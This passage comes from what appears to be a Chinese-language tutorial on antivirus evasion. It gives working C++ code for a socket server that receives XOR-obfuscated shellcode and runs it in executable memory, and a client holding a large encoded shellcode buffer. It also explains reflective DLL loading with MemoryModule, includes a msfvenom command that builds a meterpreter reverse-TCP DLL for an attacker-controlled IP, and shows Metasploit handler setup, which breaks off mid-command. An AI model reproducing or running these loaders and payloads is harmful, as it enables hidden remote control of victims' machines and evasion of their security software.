class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">RunCode</span><span class="params">(CHAR * code,DWORD dwCodeLen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hThread;</span><br><span class="line">    DWORD dwOldProtect;</span><br><span class="line">    DWORD dwThreadId;</span><br><span class="line">    PCHAR pszShellcode = (PCHAR)VirtualAlloc(<span class="literal">NULL</span>,dwCodeLen,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line">    CopyMemory(pszShellcode,code,dwCodeLen);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(DWORD i = <span class="number">0</span>;i&lt; dwCodeLen; i++)&#123;</span><br><span class="line">            _InterlockedXor8(pszShellcode+i,<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 这里开始更改它的属性为可执行</span></span><br><span class="line">        VirtualProtect(pszShellcode,dwCodeLen,PAGE_EXECUTE,&amp;dwOldProtect);</span><br><span class="line">        <span class="comment">// 执行Shellcode</span></span><br><span class="line">        hThread = CreateThread(</span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">            (LPTHREAD_START_ROUTINE)pszShellcode, <span class="comment">// 函数</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">            &amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">        );</span><br><span class="line">        WaitForSingleObject(hThread,INFINITE);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, TCHAR argv[])</span></span>&#123;</span><br><span class="line">    CHAR buf[<span class="number">801</span>];</span><br><span class="line">    DWORD dwError;</span><br><span class="line">    WORD sockVersion = MAKEWORD(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    SOCKET socks;</span><br><span class="line">    SOCKET sClient;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">s_client</span>;</span></span><br><span class="line">    INT nAddrLen = <span class="keyword">sizeof</span>(s_client);</span><br><span class="line">    SHORT sListenPort = <span class="number">8888</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (WSAStartup(sockVersion, &amp;wsaData) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        dwError = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]WSAStarup Error : %d \n&quot;</span>,dwError);</span><br><span class="line">        <span class="keyword">return</span> dwError;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    socks = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (socks == INVALID_SOCKET)</span><br><span class="line">    &#123;</span><br><span class="line">        dwError = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]Socket Error : %d \n&quot;</span>,dwError);</span><br><span class="line">        <span class="keyword">return</span> dwError;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sin</span>.sin_family = AF_INET;</span><br><span class="line">    <span class="built_in">sin</span>.sin_port = htons(sListenPort);</span><br><span class="line">    <span class="built_in">sin</span>.sin_addr.S_un.S_addr = INADDR_ANY;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(bind(socks,(struct sockaddr *)&amp;<span class="built_in">sin</span>,<span class="keyword">sizeof</span>(<span class="built_in">sin</span>)) == SOCKET_ERROR )</span><br><span class="line">    &#123;</span><br><span class="line">        dwError = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]Bind Error : %d \n&quot;</span>,dwError);</span><br><span class="line">        <span class="keyword">return</span> dwError;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">listen</span>(socks, <span class="number">5</span>) == SOCKET_ERROR)</span><br><span class="line">    &#123;</span><br><span class="line">        dwError = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]Listen  Error : %d \n&quot;</span>,dwError);</span><br><span class="line">        <span class="keyword">return</span> dwError;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sClient = accept(socks, (SOCKADDR *)&amp;s_client, &amp;nAddrLen);</span><br><span class="line">    <span class="keyword">int</span> ret = recv(sClient,buf,<span class="keyword">sizeof</span>(buf),<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Recv %d-Bytes \n&quot;</span>,ret);</span><br><span class="line">        closesocket(sClient);</span><br><span class="line">        closesocket(socks);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WSACleanup();</span><br><span class="line">    RunCode(buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Client:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="keyword">char</span> buf[] = <span class="string">&quot;\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x6a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x39\x7f\x65\x4f\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x33\x31\x44\x46\x44\x46\x23\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3d\x3a\x24\x3b\x38\x32\x0a\x0a\x0a\x0a\x0a&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, TCHAR argv[])</span></span>&#123;</span><br><span class="line">    DWORD dwError;</span><br><span class="line">    WORD sockVersion = MAKEWORD(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    SOCKET socks;</span><br><span class="line">    SHORT sListenPort = <span class="number">8888</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (WSAStartup(sockVersion, &amp;wsaData) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        dwError = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]WSAStarup Error : %d \n&quot;</span>,dwError);</span><br><span class="line">        <span class="keyword">return</span> dwError;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    socks = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (socks == INVALID_SOCKET)</span><br><span class="line">    &#123;</span><br><span class="line">        dwError = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]Socket Error : %d \n&quot;</span>,dwError);</span><br><span class="line">        <span class="keyword">return</span> dwError;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sin</span>.sin_family = AF_INET;</span><br><span class="line">    <span class="built_in">sin</span>.sin_port = htons(sListenPort);</span><br><span class="line">    <span class="built_in">sin</span>.sin_addr.S_un.S_addr = inet_addr(<span class="string">&quot;192.168.170.1&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">connect</span>(socks,(struct sockaddr *)&amp;<span class="built_in">sin</span>,<span class="keyword">sizeof</span>(<span class="built_in">sin</span>)) == SOCKET_ERROR )</span><br><span class="line">    &#123;</span><br><span class="line">        dwError = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]Bind Error : %d \n&quot;</span>,dwError);</span><br><span class="line">        <span class="keyword">return</span> dwError;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ret = send(socks,buf,<span class="keyword">sizeof</span>(buf),<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ret &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Send %d-Bytes \n&quot;</span>,ret);</span><br><span class="line">        closesocket(socks);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WSACleanup();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="第六课"><a href="#第六课" class="headerlink" title="第六课"></a>第六课</h1><h2 id="MemoryMoudle"><a href="#MemoryMoudle" class="headerlink" title="MemoryMoudle"></a>MemoryMoudle</h2><p>项目背景：Windows操作系统在执行一个Windows PE格式的文件时，Windows自身是有一个Windows PE格式的解析器，通过PE格式把文件的各个节放入不同的内存区域。</p><p>爱折腾的程序员自己也想实现这个过程，那就是反射，这个反射机制就是将Windows PE格式通过自己写的代码进行解析，并把不同的节数据加载到内存中，通常这个反射加载技术被很多APT组织、大型渗透框架、病毒作者使用比较广泛。</p><p>当一个Windows PE格式的文件变成了一个内存中的字符串，意味着这个文件可以被任意方式去转换、加密、混淆，因此反病毒软件也难以查杀。</p><p>MemoryModule就是实现了这个过程：<a href="https://github.com/fancycode/MemoryModule">https://github.com/fancycode/MemoryModule</a></p><p>但是资料都是英文的，我在国内的社区上找到了中文版本的：<a href="https://gitee.com/china_jeffery/MemoryModule">https://gitee.com/china_jeffery/MemoryModule</a></p><p>就是从内存中加载DLL，具体实现原理：</p><p><a href="https://payloads.online/archivers/2019-03-14/1">https://payloads.online/archivers/2019-03-14/1</a></p><h2 id="反射DLL加载的实验"><a href="#反射DLL加载的实验" class="headerlink" title="反射DLL加载的实验"></a>反射DLL加载的实验</h2><p>首先体验一下正常DLL加载的过程：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">msg</span><span class="params">(VOID)</span></span>&#123;</span><br><span class="line">MessageBox(<span class="literal">NULL</span>,TEXT(<span class="string">&quot;Test&quot;</span>),TEXT(<span class="string">&quot;Hello&quot;</span>),MB_OK);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">VOID</span> <span class="params">(*msg)</span><span class="params">(VOID)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">msg RunMsg;</span><br><span class="line">HMODULE  hBadCode = LoadLibrary(TEXT(<span class="string">&quot;BadCode-DLL.dll&quot;</span>));</span><br><span class="line"></span><br><span class="line">RunMsg = (msg)GetProcAddress(hBadCode,<span class="string">&quot;msg&quot;</span>);</span><br><span class="line">RunMsg();</span><br><span class="line">FreeLibrary(hBadCode);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过LoadLibrary这个API来加载DLL文件，使其运行，看起来是一个基础操作，那么还有另外一种方式吗？</p><p>接下来贴上MemoryModule的使用方法：</p><ol><li>将要加载的PE文件读入内存</li><li>初始化MemoryModule句柄</li><li>装载内存</li><li>获得导出函数地址</li><li>执行导出函数</li><li>释放MemoryModule句柄</li></ol><p>这里我将MemoryModule项目代码放入当前项目：</p><p>主要是：<code>MemoryModule.h</code>、<code>MemoryModule.cpp</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;MemoryModule.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">VOID</span> <span class="params">(*msg)</span><span class="params">(VOID)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开文件并获取大小</span></span><br><span class="line"><span class="function">DWORD <span class="title">OpenBadCodeDLL</span><span class="params">(HANDLE &amp; hBadCodeDll, LPCWSTR lpwszBadCodeFileName)</span></span>&#123;</span><br><span class="line">DWORD dwHighFileSize = <span class="number">0</span>;</span><br><span class="line">DWORD dwLowFileSize = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 打开文件</span></span><br><span class="line">hBadCodeDll = CreateFile(lpwszBadCodeFileName,GENERIC_READ,FILE_SHARE_READ,<span class="literal">NULL</span>,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL ,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span>(hBadCodeDll == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line"><span class="keyword">return</span> GetLastError();</span><br><span class="line">&#125;</span><br><span class="line">dwLowFileSize = GetFileSize(hBadCodeDll,&amp;dwHighFileSize);</span><br><span class="line"><span class="keyword">return</span> dwLowFileSize;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">msg RunMsg;  <span class="comment">// msg函数的函数指针</span></span><br><span class="line">HMEMORYMODULE hModule; <span class="comment">// MemoryModule句柄，应该可以这么理解,,</span></span><br><span class="line">HANDLE hBadCodeDll = INVALID_HANDLE_VALUE; <span class="comment">// 打开PE文件的句柄</span></span><br><span class="line">WCHAR szBadCodeFile[] = TEXT(<span class="string">&quot;C:\Users\admin\Documents\Visual Studio 2012\Projects\BadCode\Debug\BadCode-DLL.dll&quot;</span>); <span class="comment">// PE文件的物理路径</span></span><br><span class="line">DWORD dwFileSize = <span class="number">0</span>; <span class="comment">// PE文件大小</span></span><br><span class="line">DWORD dwReadOfFileSize = <span class="number">0</span>; <span class="comment">// 已读取的PE文件大小</span></span><br><span class="line">PBYTE bFileBuffer = <span class="literal">NULL</span>; <span class="comment">// PE文件的内存地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开文件</span></span><br><span class="line">dwFileSize = OpenBadCodeDLL(hBadCodeDll, szBadCodeFile);</span><br><span class="line"><span class="comment">// 如果打开失败直接退出</span></span><br><span class="line"><span class="keyword">if</span>(hBadCodeDll == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line"><span class="keyword">return</span> GetLastError();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 申请放置PE文件的内存空间</span></span><br><span class="line">bFileBuffer = <span class="keyword">new</span> BYTE[dwFileSize];</span><br><span class="line"><span class="comment">// 读取文件</span></span><br><span class="line">ReadFile(hBadCodeDll,bFileBuffer,dwFileSize,&amp;dwReadOfFileSize,<span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">// 如果读取错误直接退出</span></span><br><span class="line"><span class="keyword">if</span>(dwReadOfFileSize != dwFileSize)&#123;</span><br><span class="line"><span class="keyword">return</span> GetLastError();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 关闭打开PE文件的句柄</span></span><br><span class="line">CloseHandle(hBadCodeDll);</span><br><span class="line"><span class="comment">// 导入PE文件</span></span><br><span class="line">hModule = MemoryLoadLibrary(bFileBuffer);</span><br><span class="line"><span class="comment">// 如果加载失败，就退出</span></span><br><span class="line"><span class="keyword">if</span>(hModule == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">delete</span> [] bFileBuffer;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获取msg导出函数地址</span></span><br><span class="line">RunMsg = (msg)MemoryGetProcAddress(hModule,<span class="string">&quot;msg&quot;</span>);</span><br><span class="line"><span class="comment">// 运行msg函数</span></span><br><span class="line">RunMsg();</span><br><span class="line"><span class="comment">// 释放资源</span></span><br><span class="line">MemoryFreeLibrary(hModule);</span><br><span class="line"><span class="comment">// 释放PE内存</span></span><br><span class="line"><span class="keyword">delete</span> [] bFileBuffer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> GetLastError();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="反射DLL-与-MSF-联动"><a href="#反射DLL-与-MSF-联动" class="headerlink" title="反射DLL 与 MSF 联动"></a>反射DLL 与 MSF 联动</h2><blockquote><p>通过Socket将Msf生成的DLL给接收到内存中，然后载入MemoryModule中，直接执行。</p></blockquote><p>生成DLL</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.170.138 LPORT&#x3D;8899 -f dll -o ~&#x2F;y.dll</span><br></pre></td></tr></table></figure><p>设置MSF dll 发射器(set DLL 命令)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; handler -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp -H 192.168.170.138 -P 8899</span><br><span class="line">[*] Payload handler running as background job 0.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.170.138:8899 </span><br><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;patchupdllinject&#x2F;reverse_tcp</span><br><span class="line">payload &#x3D;&gt; 